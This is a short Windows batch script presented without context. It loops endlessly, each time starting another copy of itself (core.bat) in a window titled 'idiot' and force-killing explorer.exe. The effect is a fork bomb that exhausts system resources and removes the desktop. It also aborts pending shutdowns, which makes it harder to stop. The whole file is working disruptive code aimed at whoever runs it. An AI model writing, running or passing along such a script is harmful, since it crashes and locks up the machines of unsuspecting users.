@echo off
:s
start "idiot" core.bat
color f0
color 40
shutdown -a
taskkill /f /im explorer.exe
goto s